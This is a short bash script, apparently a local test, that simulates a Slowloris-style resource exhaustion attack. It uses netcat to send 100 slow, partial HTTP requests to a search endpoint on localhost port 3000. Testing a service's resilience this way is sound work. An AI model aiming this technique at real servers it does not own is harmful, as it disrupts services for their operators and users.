#!/bin/bash

echo "🔥 SLOW REQUEST / RESOURCE EXHAUSTION SIMULATION"

URL="http://localhost:3000/search/providers?q=slow"

for i in {1..100}; do
  (
    printf "GET /search/providers?q=slow HTTP/1.1\r\nHost: localhost\r\n";
    sleep 5;
    printf "\r\n";
  ) | nc localhost 3000 &
done

wait
echo "✅ Slowloris simulation complete"
